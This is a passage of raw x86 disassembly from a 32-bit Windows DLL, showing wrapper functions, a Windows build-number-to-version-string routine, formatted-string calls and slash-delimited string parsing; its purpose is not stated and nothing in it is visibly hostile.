10003e9e:	8b c3                	mov    %ebx,%eax
10003ea0:	5b                   	pop    %ebx
10003ea1:	5d                   	pop    %ebp
10003ea2:	c2 08 00             	ret    $0x8
10003ea5:	55                   	push   %ebp
10003ea6:	8b ec                	mov    %esp,%ebp
10003ea8:	51                   	push   %ecx
10003ea9:	53                   	push   %ebx
10003eaa:	56                   	push   %esi
10003eab:	6a 01                	push   $0x1
10003ead:	33 db                	xor    %ebx,%ebx
10003eaf:	e8 16 fb ff ff       	call   0x100039ca
10003eb4:	8b f0                	mov    %eax,%esi
10003eb6:	85 f6                	test   %esi,%esi
10003eb8:	74 1a                	je     0x10003ed4
10003eba:	6a 02                	push   $0x2
10003ebc:	6a 02                	push   $0x2
10003ebe:	ff 75 08             	pushl  0x8(%ebp)
10003ec1:	ff 75 10             	pushl  0x10(%ebp)
10003ec4:	ff 75 0c             	pushl  0xc(%ebp)
10003ec7:	e8 65 02 00 00       	call   0x10004131
10003ecc:	56                   	push   %esi
10003ecd:	8b d8                	mov    %eax,%ebx
10003ecf:	e8 fb 01 00 00       	call   0x100040cf
10003ed4:	5e                   	pop    %esi
10003ed5:	8b c3                	mov    %ebx,%eax
10003ed7:	5b                   	pop    %ebx
10003ed8:	59                   	pop    %ecx
10003ed9:	5d                   	pop    %ebp
10003eda:	c2 0c 00             	ret    $0xc
10003edd:	55                   	push   %ebp
10003ede:	8b ec                	mov    %esp,%ebp
10003ee0:	51                   	push   %ecx
10003ee1:	53                   	push   %ebx
10003ee2:	56                   	push   %esi
10003ee3:	6a 01                	push   $0x1
10003ee5:	33 db                	xor    %ebx,%ebx
10003ee7:	e8 de fa ff ff       	call   0x100039ca
10003eec:	8b f0                	mov    %eax,%esi
10003eee:	85 f6                	test   %esi,%esi
10003ef0:	74 16                	je     0x10003f08
10003ef2:	ff 75 10             	pushl  0x10(%ebp)
10003ef5:	ff 75 0c             	pushl  0xc(%ebp)
10003ef8:	ff 75 08             	pushl  0x8(%ebp)
10003efb:	e8 e2 0d 00 00       	call   0x10004ce2
10003f00:	56                   	push   %esi
10003f01:	8b d8                	mov    %eax,%ebx
10003f03:	e8 c7 01 00 00       	call   0x100040cf
10003f08:	5e                   	pop    %esi
10003f09:	8b c3                	mov    %ebx,%eax
10003f0b:	5b                   	pop    %ebx
10003f0c:	59                   	pop    %ecx
10003f0d:	5d                   	pop    %ebp
10003f0e:	c2 0c 00             	ret    $0xc
10003f11:	55                   	push   %ebp
10003f12:	8b ec                	mov    %esp,%ebp
10003f14:	83 ec 10             	sub    $0x10,%esp
10003f17:	80 39 2f             	cmpb   $0x2f,(%ecx)
10003f1a:	74 05                	je     0x10003f21
10003f1c:	83 c8 ff             	or     $0xffffffff,%eax
10003f1f:	c9                   	leave  
10003f20:	c3                   	ret    
10003f21:	33 c0                	xor    %eax,%eax
10003f23:	40                   	inc    %eax
10003f24:	80 79 01 2f          	cmpb   $0x2f,0x1(%ecx)
10003f28:	74 13                	je     0x10003f3d
10003f2a:	83 f8 10             	cmp    $0x10,%eax
10003f2d:	7d 0e                	jge    0x10003f3d
10003f2f:	8a 14 08             	mov    (%eax,%ecx,1),%dl
10003f32:	88 54 05 ef          	mov    %dl,-0x11(%ebp,%eax,1)
10003f36:	40                   	inc    %eax
10003f37:	80 3c 08 2f          	cmpb   $0x2f,(%eax,%ecx,1)
10003f3b:	75 ed                	jne    0x10003f2a
10003f3d:	c6 44 05 ef 00       	movb   $0x0,-0x11(%ebp,%eax,1)
10003f42:	8d 45 f0             	lea    -0x10(%ebp),%eax
10003f45:	50                   	push   %eax
10003f46:	ff 15 9c e1 00 10    	call   *0x1000e19c
10003f4c:	c9                   	leave  
10003f4d:	c3                   	ret    
10003f4e:	cc                   	int3   
10003f4f:	55                   	push   %ebp
10003f50:	8b ec                	mov    %esp,%ebp
10003f52:	81 ec 34 01 00 00    	sub    $0x134,%esp
10003f58:	56                   	push   %esi
10003f59:	57                   	push   %edi
10003f5a:	be 54 e5 00 10       	mov    $0x1000e554,%esi
10003f5f:	8d 7d e0             	lea    -0x20(%ebp),%edi
10003f62:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10003f63:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
10003f65:	6a 06                	push   $0x6
10003f67:	59                   	pop    %ecx
10003f68:	33 c0                	xor    %eax,%eax
10003f6a:	8d 7d e6             	lea    -0x1a(%ebp),%edi
10003f6d:	f3 ab                	rep stos %eax,%es:(%edi)
10003f6f:	66 ab                	stos   %ax,%es:(%edi)
10003f71:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
10003f77:	50                   	push   %eax
10003f78:	c7 85 cc fe ff ff 14 	movl   $0x114,-0x134(%ebp)
10003f7f:	01 00 00 
10003f82:	ff 15 20 e1 00 10    	call   *0x1000e120
10003f88:	85 c0                	test   %eax,%eax
10003f8a:	0f 84 a8 00 00 00    	je     0x10004038
10003f90:	8b 85 d8 fe ff ff    	mov    -0x128(%ebp),%eax
10003f96:	3d b0 1d 00 00       	cmp    $0x1db0,%eax
10003f9b:	75 07                	jne    0x10003fa4
10003f9d:	68 5c e5 00 10       	push   $0x1000e55c
10003fa2:	eb 75                	jmp    0x10004019
10003fa4:	3d b1 1d 00 00       	cmp    $0x1db1,%eax
10003fa9:	75 07                	jne    0x10003fb2
10003fab:	68 64 e5 00 10       	push   $0x1000e564
10003fb0:	eb 67                	jmp    0x10004019
10003fb2:	3d 28 0a 00 00       	cmp    $0xa28,%eax
10003fb7:	75 07                	jne    0x10003fc0
10003fb9:	68 70 e5 00 10       	push   $0x1000e570
10003fbe:	eb 59                	jmp    0x10004019
10003fc0:	3d f0 23 00 00       	cmp    $0x23f0,%eax
10003fc5:	75 07                	jne    0x10003fce
10003fc7:	68 78 e5 00 10       	push   $0x1000e578
10003fcc:	eb 4b                	jmp    0x10004019
10003fce:	3d 80 25 00 00       	cmp    $0x2580,%eax
10003fd3:	75 07                	jne    0x10003fdc
10003fd5:	68 80 e5 00 10       	push   $0x1000e580
10003fda:	eb 3d                	jmp    0x10004019
10003fdc:	3d ce 0e 00 00       	cmp    $0xece,%eax
10003fe1:	75 07                	jne    0x10003fea
10003fe3:	68 88 e5 00 10       	push   $0x1000e588
10003fe8:	eb 2f                	jmp    0x10004019
10003fea:	3d 72 17 00 00       	cmp    $0x1772,%eax
10003fef:	75 07                	jne    0x10003ff8
10003ff1:	68 98 e5 00 10       	push   $0x1000e598
10003ff6:	eb 21                	jmp    0x10004019
10003ff8:	3d 70 17 00 00       	cmp    $0x1770,%eax
10003ffd:	75 07                	jne    0x10004006
10003fff:	68 a8 e5 00 10       	push   $0x1000e5a8
10004004:	eb 13                	jmp    0x10004019
10004006:	3d 71 17 00 00       	cmp    $0x1771,%eax
1000400b:	75 07                	jne    0x10004014
1000400d:	68 b4 e5 00 10       	push   $0x1000e5b4
10004012:	eb 05                	jmp    0x10004019
10004014:	68 c4 e5 00 10       	push   $0x1000e5c4
10004019:	6a 20                	push   $0x20
1000401b:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
10004020:	58                   	pop    %eax
10004021:	8d 4d e0             	lea    -0x20(%ebp),%ecx
10004024:	e8 79 ee ff ff       	call   0x10002ea2
10004029:	68 cc e5 00 10       	push   $0x1000e5cc
1000402e:	6a 20                	push   $0x20
10004030:	8d 7d e0             	lea    -0x20(%ebp),%edi
10004033:	e8 e4 ed ff ff       	call   0x10002e1c
10004038:	ff 75 14             	pushl  0x14(%ebp)
1000403b:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000403e:	68 59 04 00 00       	push   $0x459
10004043:	50                   	push   %eax
10004044:	ff 75 10             	pushl  0x10(%ebp)
10004047:	ff 75 0c             	pushl  0xc(%ebp)
1000404a:	68 d4 e5 00 10       	push   $0x1000e5d4
1000404f:	ff 75 08             	pushl  0x8(%ebp)
10004052:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10004058:	83 c4 1c             	add    $0x1c,%esp
1000405b:	33 c0                	xor    %eax,%eax
1000405d:	5f                   	pop    %edi
1000405e:	40                   	inc    %eax
1000405f:	5e                   	pop    %esi
10004060:	c9                   	leave  
10004061:	c3                   	ret    
10004062:	55                   	push   %ebp
10004063:	8b ec                	mov    %esp,%ebp
10004065:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
10004069:	ff 75 1c             	pushl  0x1c(%ebp)
1000406c:	75 13                	jne    0x10004081
1000406e:	ff 75 14             	pushl  0x14(%ebp)
10004071:	ff 75 10             	pushl  0x10(%ebp)
10004074:	ff 75 0c             	pushl  0xc(%ebp)
10004077:	e8 d3 fe ff ff       	call   0x10003f4f
1000407c:	83 c4 10             	add    $0x10,%esp
1000407f:	eb 3f                	jmp    0x100040c0
10004081:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
10004085:	75 1c                	jne    0x100040a3
10004087:	ff 75 08             	pushl  0x8(%ebp)
1000408a:	ff 75 14             	pushl  0x14(%ebp)
1000408d:	ff 75 10             	pushl  0x10(%ebp)
10004090:	68 e8 e5 00 10       	push   $0x1000e5e8
10004095:	ff 75 0c             	pushl  0xc(%ebp)
10004098:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000409e:	83 c4 18             	add    $0x18,%esp
100040a1:	eb 1d                	jmp    0x100040c0
100040a3:	ff 75 18             	pushl  0x18(%ebp)
100040a6:	ff 75 08             	pushl  0x8(%ebp)
100040a9:	ff 75 14             	pushl  0x14(%ebp)
100040ac:	ff 75 10             	pushl  0x10(%ebp)
100040af:	68 f8 e5 00 10       	push   $0x1000e5f8
100040b4:	ff 75 0c             	pushl  0xc(%ebp)
100040b7:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
100040bd:	83 c4 1c             	add    $0x1c,%esp
100040c0:	33 c0                	xor    %eax,%eax
100040c2:	40                   	inc    %eax
100040c3:	5d                   	pop    %ebp
100040c4:	c3                   	ret    
100040c5:	55                   	push   %ebp
100040c6:	8b ec                	mov    %esp,%ebp
100040c8:	5d                   	pop    %ebp
100040c9:	ff 25 2c e1 00 10    	jmp    *0x1000e12c
100040cf:	55                   	push   %ebp
100040d0:	8b ec                	mov    %esp,%ebp
100040d2:	5d                   	pop    %ebp
100040d3:	ff 25 24 e1 00 10    	jmp    *0x1000e124
100040d9:	55                   	push   %ebp
100040da:	8b ec                	mov    %esp,%ebp
100040dc:	8b 86 ec 06 00 00    	mov    0x6ec(%esi),%eax
100040e2:	57                   	push   %edi
100040e3:	33 ff                	xor    %edi,%edi
100040e5:	3b c7                	cmp    %edi,%eax
100040e7:	74 13                	je     0x100040fc
100040e9:	50                   	push   %eax
100040ea:	e8 24 29 00 00       	call   0x10006a13
100040ef:	59                   	pop    %ecx
100040f0:	89 be f0 06 00 00    	mov    %edi,0x6f0(%esi)
100040f6:	89 be ec 06 00 00    	mov    %edi,0x6ec(%esi)
100040fc:	39 7d 08             	cmp    %edi,0x8(%ebp)
100040ff:	74 28                	je     0x10004129
10004101:	3b df                	cmp    %edi,%ebx
10004103:	74 24                	je     0x10004129
10004105:	53                   	push   %ebx
10004106:	89 9e f0 06 00 00    	mov    %ebx,0x6f0(%esi)
1000410c:	e8 d3 28 00 00       	call   0x100069e4
10004111:	ff b6 f0 06 00 00    	pushl  0x6f0(%esi)
10004117:	89 86 ec 06 00 00    	mov    %eax,0x6ec(%esi)
1000411d:	ff 75 08             	pushl  0x8(%ebp)
10004120:	50                   	push   %eax
10004121:	e8 ea 9b 00 00       	call   0x1000dd10
10004126:	83 c4 10             	add    $0x10,%esp
10004129:	33 c0                	xor    %eax,%eax
1000412b:	40                   	inc    %eax
1000412c:	5f                   	pop    %edi
1000412d:	5d                   	pop    %ebp
1000412e:	c2 04 00             	ret    $0x4
10004131:	55                   	push   %ebp
10004132:	8b ec                	mov    %esp,%ebp
10004134:	51                   	push   %ecx
10004135:	53                   	push   %ebx
10004136:	57                   	push   %edi
10004137:	56                   	push   %esi
10004138:	e8 88 ff ff ff       	call   0x100040c5
1000413d:	68 00 00 20 00       	push   $0x200000
10004142:	33 ff                	xor    %edi,%edi
10004144:	e8 9b 28 00 00       	call   0x100069e4
10004149:	59                   	pop    %ecx
1000414a:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000414d:	89 01                	mov    %eax,(%ecx)
1000414f:	85 c0                	test   %eax,%eax
10004151:	0f 84 b6 00 00 00    	je     0x1000420d
10004157:	8b 1d 34 e1 00 10    	mov    0x1000e134,%ebx
1000415d:	8d 86 40 05 00 00    	lea    0x540(%esi),%eax
10004163:	50                   	push   %eax
10004164:	ff d3                	call   *%ebx
10004166:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004169:	8d 86 44 06 00 00    	lea    0x644(%esi),%eax
1000416f:	50                   	push   %eax
10004170:	ff d3                	call   *%ebx
10004172:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10004175:	03 d8                	add    %eax,%ebx
10004177:	8d 86 40 04 00 00    	lea    0x440(%esi),%eax
1000417d:	50                   	push   %eax
1000417e:	ff 15 34 e1 00 10    	call   *0x1000e134
10004184:	8d 84 18 06 01 00 00 	lea    0x106(%eax,%ebx,1),%eax
1000418b:	50                   	push   %eax
1000418c:	e8 53 28 00 00       	call   0x100069e4
10004191:	8b d8                	mov    %eax,%ebx
10004193:	59                   	pop    %ecx
10004194:	85 db                	test   %ebx,%ebx
10004196:	74 75                	je     0x1000420d
10004198:	8d 86 44 06 00 00    	lea    0x644(%esi),%eax
1000419e:	50                   	push   %eax
1000419f:	ff 75 10             	pushl  0x10(%ebp)
100041a2:	8d 86 40 04 00 00    	lea    0x440(%esi),%eax
100041a8:	50                   	push   %eax
100041a9:	8d 86 40 05 00 00    	lea    0x540(%esi),%eax
100041af:	50                   	push   %eax
100041b0:	68 0c e6 00 10       	push   $0x1000e60c
100041b5:	53                   	push   %ebx
100041b6:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
100041bc:	8b 45 14             	mov    0x14(%ebp),%eax
100041bf:	ff 75 18             	pushl  0x18(%ebp)
100041c2:	69 c0 02 01 00 00    	imul   $0x102,%eax,%eax
100041c8:	8b 4d 08             	mov    0x8(%ebp),%ecx
100041cb:	68 00 00 20 00       	push   $0x200000
100041d0:	ff 31                	pushl  (%ecx)
100041d2:	03 c6                	add    %esi,%eax
100041d4:	0f b7 88 38 01 00 00 	movzwl 0x138(%eax),%ecx
100041db:	53                   	push   %ebx
100041dc:	51                   	push   %ecx
100041dd:	83 c0 38             	add    $0x38,%eax
100041e0:	50                   	push   %eax
100041e1:	e8 8d 24 00 00       	call   0x10006673
100041e6:	8b 7d 0c             	mov    0xc(%ebp),%edi
100041e9:	53                   	push   %ebx
100041ea:	89 07                	mov    %eax,(%edi)
100041ec:	e8 22 28 00 00       	call   0x10006a13
100041f1:	83 c4 34             	add    $0x34,%esp
100041f4:	6a 10                	push   $0x10
100041f6:	58                   	pop    %eax
100041f7:	3b 07                	cmp    (%edi),%eax
100041f9:	1b ff                	sbb    %edi,%edi
100041fb:	f7 df                	neg    %edi
100041fd:	75 0e                	jne    0x1000420d
100041ff:	8b 5d 08             	mov    0x8(%ebp),%ebx
10004202:	ff 33                	pushl  (%ebx)
10004204:	e8 0a 28 00 00       	call   0x10006a13
10004209:	83 23 00             	andl   $0x0,(%ebx)
1000420c:	59                   	pop    %ecx
1000420d:	56                   	push   %esi
1000420e:	e8 bc fe ff ff       	call   0x100040cf
10004213:	8b c7                	mov    %edi,%eax
10004215:	5f                   	pop    %edi
10004216:	5b                   	pop    %ebx
10004217:	c9                   	leave  
10004218:	c2 14 00             	ret    $0x14
1000421b:	55                   	push   %ebp
1000421c:	8b ec                	mov    %esp,%ebp
1000421e:	6a 02                	push   $0x2
10004220:	6a 00                	push   $0x0
10004222:	68 94 e6 00 10       	push   $0x1000e694
10004227:	ff 75 0c             	pushl  0xc(%ebp)
1000422a:	ff 75 08             	pushl  0x8(%ebp)
1000422d:	e8 ff fe ff ff       	call   0x10004131
10004232:	5d                   	pop    %ebp
10004233:	c2 08 00             	ret    $0x8
10004236:	55                   	push   %ebp
10004237:	8b ec                	mov    %esp,%ebp
10004239:	51                   	push   %ecx
1000423a:	56                   	push   %esi
1000423b:	8b f0                	mov    %eax,%esi
1000423d:	83 7e 08 04          	cmpl   $0x4,0x8(%esi)
10004241:	74 04                	je     0x10004247
10004243:	33 c0                	xor    %eax,%eax
10004245:	eb 14                	jmp    0x1000425b
10004247:	6a 05                	push   $0x5
10004249:	6a 00                	push   $0x0
1000424b:	68 98 e6 00 10       	push   $0x1000e698
10004250:	ff 75 0c             	pushl  0xc(%ebp)
10004253:	ff 75 08             	pushl  0x8(%ebp)
10004256:	e8 d6 fe ff ff       	call   0x10004131
1000425b:	5e                   	pop    %esi
1000425c:	59                   	pop    %ecx
1000425d:	5d                   	pop    %ebp
1000425e:	c2 08 00             	ret    $0x8
10004261:	55                   	push   %ebp
10004262:	8b ec                	mov    %esp,%ebp
10004264:	51                   	push   %ecx
10004265:	56                   	push   %esi
10004266:	8b f0                	mov    %eax,%esi
10004268:	83 7e 08 04          	cmpl   $0x4,0x8(%esi)
1000426c:	74 04                	je     0x10004272
1000426e:	33 c0                	xor    %eax,%eax
10004270:	eb 14                	jmp    0x10004286
10004272:	6a 05                	push   $0x5
10004274:	6a 00                	push   $0x0
10004276:	68 a0 e6 00 10       	push   $0x1000e6a0
1000427b:	ff 75 0c             	pushl  0xc(%ebp)
1000427e:	ff 75 08             	pushl  0x8(%ebp)
10004281:	e8 ab fe ff ff       	call   0x10004131
10004286:	5e                   	pop    %esi
10004287:	59                   	pop    %ecx
10004288:	5d                   	pop    %ebp
10004289:	c2 08 00             	ret    $0x8
1000428c:	55                   	push   %ebp
1000428d:	8b ec                	mov    %esp,%ebp
1000428f:	51                   	push   %ecx
10004290:	56                   	push   %esi
10004291:	8b f0                	mov    %eax,%esi
10004293:	83 7e 08 04          	cmpl   $0x4,0x8(%esi)
10004297:	74 04                	je     0x1000429d
10004299:	33 c0                	xor    %eax,%eax
1000429b:	eb 14                	jmp    0x100042b1
1000429d:	6a 05                	push   $0x5
1000429f:	6a 00                	push   $0x0
100042a1:	68 ac e6 00 10       	push   $0x1000e6ac
100042a6:	ff 75 0c             	pushl  0xc(%ebp)
100042a9:	ff 75 08             	pushl  0x8(%ebp)
100042ac:	e8 80 fe ff ff       	call   0x10004131
100042b1:	5e                   	pop    %esi
100042b2:	59                   	pop    %ecx
100042b3:	5d                   	pop    %ebp
100042b4:	c2 08 00             	ret    $0x8
100042b7:	56                   	push   %esi
100042b8:	57                   	push   %edi
100042b9:	33 f6                	xor    %esi,%esi
100042bb:	e8 ce 42 00 00       	call   0x1000858e
100042c0:	8b f8                	mov    %eax,%edi
100042c2:	e8 57 12 00 00       	call   0x1000551e
100042c7:	3b c7                	cmp    %edi,%eax
100042c9:	77 01                	ja     0x100042cc
100042cb:	46                   	inc    %esi
100042cc:	5f                   	pop    %edi
100042cd:	8b c6                	mov    %esi,%eax
100042cf:	5e                   	pop    %esi
100042d0:	c3                   	ret    
100042d1:	55                   	push   %ebp
100042d2:	8b ec                	mov    %esp,%ebp
100042d4:	83 bf e4 06 00 00 00 	cmpl   $0x0,0x6e4(%edi)
100042db:	56                   	push   %esi
100042dc:	75 11                	jne    0x100042ef
100042de:	68 00 00 01 00       	push   $0x10000
100042e3:	e8 fc 26 00 00       	call   0x100069e4
100042e8:	59                   	pop    %ecx
100042e9:	89 87 e4 06 00 00    	mov    %eax,0x6e4(%edi)
100042ef:	8b b7 e4 06 00 00    	mov    0x6e4(%edi),%esi
100042f5:	85 f6                	test   %esi,%esi
100042f7:	75 04                	jne    0x100042fd
100042f9:	33 c0                	xor    %eax,%eax
100042fb:	eb 19                	jmp    0x10004316
100042fd:	8b 55 08             	mov    0x8(%ebp),%edx
10004300:	56                   	push   %esi
10004301:	e8 8b 42 00 00       	call   0x10008591
10004306:	59                   	pop    %ecx
10004307:	33 c9                	xor    %ecx,%ecx
10004309:	85 c0                	test   %eax,%eax
1000430b:	0f 95 c1             	setne  %cl
1000430e:	89 87 e8 06 00 00    	mov    %eax,0x6e8(%edi)
10004314:	8b c1                	mov    %ecx,%eax
10004316:	5e                   	pop    %esi
10004317:	5d                   	pop    %ebp
10004318:	c2 04 00             	ret    $0x4
1000431b:	c7 80 c8 06 00 00 3c 	movl   $0x10002f3c,0x6c8(%eax)
10004322:	2f 00 10 
10004325:	89 88 c4 06 00 00    	mov    %ecx,0x6c4(%eax)
1000432b:	c3                   	ret    
1000432c:	c7 80 d0 06 00 00 0d 	movl   $0x1000300d,0x6d0(%eax)
10004333:	30 00 10 
10004336:	89 88 cc 06 00 00    	mov    %ecx,0x6cc(%eax)
1000433c:	c3                   	ret    
1000433d:	c7 80 d4 06 00 00 19 	movl   $0x10002f19,0x6d4(%eax)
10004344:	2f 00 10 
10004347:	89 88 d8 06 00 00    	mov    %ecx,0x6d8(%eax)
1000434d:	c3                   	ret    
1000434e:	55                   	push   %ebp
1000434f:	8b ec                	mov    %esp,%ebp
10004351:	83 ec 14             	sub    $0x14,%esp
10004354:	53                   	push   %ebx
10004355:	56                   	push   %esi
10004356:	57                   	push   %edi
10004357:	8b f8                	mov    %eax,%edi
10004359:	57                   	push   %edi
1000435a:	e8 66 fd ff ff       	call   0x100040c5
1000435f:	8d 45 f0             	lea    -0x10(%ebp),%eax
10004362:	50                   	push   %eax
10004363:	33 db                	xor    %ebx,%ebx
10004365:	8d 45 f8             	lea    -0x8(%ebp),%eax
10004368:	50                   	push   %eax
10004369:	8b f7                	mov    %edi,%esi
1000436b:	89 5d f4             	mov    %ebx,-0xc(%ebp)
1000436e:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10004371:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10004374:	e8 a2 fe ff ff       	call   0x1000421b
10004379:	85 c0                	test   %eax,%eax
1000437b:	0f 84 86 00 00 00    	je     0x10004407
10004381:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10004384:	8b b7 f4 06 00 00    	mov    0x6f4(%edi),%esi
1000438a:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000438d:	50                   	push   %eax
1000438e:	ff 75 f8             	pushl  -0x8(%ebp)
10004391:	8d 45 fc             	lea    -0x4(%ebp),%eax
10004394:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10004397:	89 5d ec             	mov    %ebx,-0x14(%ebp)
1000439a:	e8 f5 37 00 00       	call   0x10007b94
1000439f:	85 c0                	test   %eax,%eax
100043a1:	74 56                	je     0x100043f9
100043a3:	8b 45 fc             	mov    -0x4(%ebp),%eax
100043a6:	e8 0c ff ff ff       	call   0x100042b7
100043ab:	85 c0                	test   %eax,%eax
100043ad:	74 41                	je     0x100043f0
100043af:	ff 75 fc             	pushl  -0x4(%ebp)
100043b2:	e8 1a ff ff ff       	call   0x100042d1
100043b7:	85 c0                	test   %eax,%eax
100043b9:	74 35                	je     0x100043f0
100043bb:	33 f6                	xor    %esi,%esi
100043bd:	46                   	inc    %esi
100043be:	39 77 08             	cmp    %esi,0x8(%edi)
100043c1:	75 2d                	jne    0x100043f0
100043c3:	8b c7                	mov    %edi,%eax
100043c5:	e8 e4 05 00 00       	call   0x100049ae
100043ca:	85 c0                	test   %eax,%eax
100043cc:	75 22                	jne    0x100043f0
100043ce:	39 77 08             	cmp    %esi,0x8(%edi)
100043d1:	75 1d                	jne    0x100043f0
100043d3:	8b 87 d0 06 00 00    	mov    0x6d0(%edi),%eax
100043d9:	c7 47 08 04 00 00 00 	movl   $0x4,0x8(%edi)
100043e0:	3b c3                	cmp    %ebx,%eax
100043e2:	74 09                	je     0x100043ed
100043e4:	ff b7 cc 06 00 00    	pushl  0x6cc(%edi)
100043ea:	57                   	push   %edi
100043eb:	ff d0                	call   *%eax
100043ed:	89 75 f4             	mov    %esi,-0xc(%ebp)
100043f0:	ff 75 fc             	pushl  -0x4(%ebp)
100043f3:	e8 1b 26 00 00       	call   0x10006a13
100043f8:	59                   	pop    %ecx
100043f9:	ff 75 f8             	pushl  -0x8(%ebp)
100043fc:	e8 12 26 00 00       	call   0x10006a13
10004401:	59                   	pop    %ecx
10004402:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
10004405:	75 07                	jne    0x1000440e
10004407:	c7 47 08 03 00 00 00 	movl   $0x3,0x8(%edi)
1000440e:	57                   	push   %edi
1000440f:	e8 bb fc ff ff       	call   0x100040cf
10004414:	8b 45 f4             	mov    -0xc(%ebp),%eax
10004417:	5f                   	pop    %edi
10004418:	5e                   	pop    %esi
10004419:	5b                   	pop    %ebx
1000441a:	c9                   	leave  
1000441b:	c3                   	ret    
1000441c:	89 88 f4 06 00 00    	mov    %ecx,0x6f4(%eax)
10004422:	c3                   	ret    
10004423:	55                   	push   %ebp
10004424:	8b ec                	mov    %esp,%ebp
10004426:	81 ec c0 01 00 00    	sub    $0x1c0,%esp
1000442c:	53                   	push   %ebx
1000442d:	8b 5d 08             	mov    0x8(%ebp),%ebx
10004430:	53                   	push   %ebx
10004431:	e8 8f fc ff ff       	call   0x100040c5
10004436:	80 3f 2f             	cmpb   $0x2f,(%edi)
10004439:	74 07                	je     0x10004442
1000443b:	33 c0                	xor    %eax,%eax
1000443d:	e9 8a 00 00 00       	jmp    0x100044cc
10004442:	56                   	push   %esi
10004443:	33 f6                	xor    %esi,%esi
10004445:	80 7f 01 2f          	cmpb   $0x2f,0x1(%edi)
10004449:	74 08                	je     0x10004453
1000444b:	46                   	inc    %esi
1000444c:	80 7c 3e 01 2f       	cmpb   $0x2f,0x1(%esi,%edi,1)
10004451:	75 f8                	jne    0x1000444b
10004453:	46                   	inc    %esi
10004454:	33 c9                	xor    %ecx,%ecx
10004456:	eb 0b                	jmp    0x10004463
10004458:	3b 75 0c             	cmp    0xc(%ebp),%esi
1000445b:	73 0e                	jae    0x1000446b
1000445d:	88 44 0d 80          	mov    %al,-0x80(%ebp,%ecx,1)
10004461:	46                   	inc    %esi
10004462:	41                   	inc    %ecx
10004463:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
10004467:	3c 2f                	cmp    $0x2f,%al
10004469:	75 ed                	jne    0x10004458
1000446b:	81 c3 40 05 00 00    	add    $0x540,%ebx
10004471:	53                   	push   %ebx
10004472:	8b 1d 30 e1 00 10    	mov    0x1000e130,%ebx
10004478:	8d 45 80             	lea    -0x80(%ebp),%eax
1000447b:	50                   	push   %eax
1000447c:	c6 44 0d 80 00       	movb   $0x0,-0x80(%ebp,%ecx,1)
10004481:	46                   	inc    %esi
10004482:	ff d3                	call   *%ebx
10004484:	85 c0                	test   %eax,%eax
10004486:	75 39                	jne    0x100044c1
10004488:	33 c9                	xor    %ecx,%ecx
1000448a:	eb 0e                	jmp    0x1000449a
1000448c:	3b 75 0c             	cmp    0xc(%ebp),%esi
1000448f:	73 11                	jae    0x100044a2
10004491:	88 84 0d 40 fe ff ff 	mov    %al,-0x1c0(%ebp,%ecx,1)
10004498:	46                   	inc    %esi
10004499:	41                   	inc    %ecx
1000449a:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
1000449e:	3c 2f                	cmp    $0x2f,%al
100044a0:	75 ea                	jne    0x1000448c
100044a2:	8b 45 08             	mov    0x8(%ebp),%eax
100044a5:	05 40 04 00 00       	add    $0x440,%eax
100044aa:	50                   	push   %eax
100044ab:	8d 85 40 fe ff ff    	lea    -0x1c0(%ebp),%eax
100044b1:	50                   	push   %eax
100044b2:	c6 84 0d 40 fe ff ff 	movb   $0x0,-0x1c0(%ebp,%ecx,1)
100044b9:	00 
100044ba:	46                   	inc    %esi
100044bb:	ff d3                	call   *%ebx
100044bd:	85 c0                	test   %eax,%eax
100044bf:	74 10                	je     0x100044d1
100044c1:	ff 75 08             	pushl  0x8(%ebp)
100044c4:	e8 06 fc ff ff       	call   0x100040cf
100044c9:	33 c0                	xor    %eax,%eax
100044cb:	5e                   	pop    %esi
100044cc:	5b                   	pop    %ebx
100044cd:	c9                   	leave  
100044ce:	c2 0c 00             	ret    $0xc
100044d1:	33 c9                	xor    %ecx,%ecx
100044d3:	eb 0e                	jmp    0x100044e3
100044d5:	3b 75 0c             	cmp    0xc(%ebp),%esi
100044d8:	73 11                	jae    0x100044eb
100044da:	88 84 0d 40 ff ff ff 	mov    %al,-0xc0(%ebp,%ecx,1)
100044e1:	46                   	inc    %esi
100044e2:	41                   	inc    %ecx
100044e3:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
100044e7:	3c 2f                	cmp    $0x2f,%al
100044e9:	75 ea                	jne    0x100044d5
100044eb:	8b 45 08             	mov    0x8(%ebp),%eax
100044ee:	83 c0 14             	add    $0x14,%eax
100044f1:	50                   	push   %eax
100044f2:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
100044f8:	50                   	push   %eax
100044f9:	c6 84 0d 40 ff ff ff 	movb   $0x0,-0xc0(%ebp,%ecx,1)
10004500:	00 
10004501:	46                   	inc    %esi
10004502:	ff d3                	call   *%ebx
10004504:	85 c0                	test   %eax,%eax
10004506:	74 0e                	je     0x10004516
10004508:	33 f6                	xor    %esi,%esi
1000450a:	ff 75 08             	pushl  0x8(%ebp)
1000450d:	e8 bd fb ff ff       	call   0x100040cf
10004512:	8b c6                	mov    %esi,%eax
10004514:	eb b5                	jmp    0x100044cb
10004516:	33 c9                	xor    %ecx,%ecx
10004518:	eb 0b                	jmp    0x10004525
1000451a:	3b 75 0c             	cmp    0xc(%ebp),%esi
1000451d:	73 0e                	jae    0x1000452d
1000451f:	88 44 0d c0          	mov    %al,-0x40(%ebp,%ecx,1)
10004523:	46                   	inc    %esi
10004524:	41                   	inc    %ecx
10004525:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
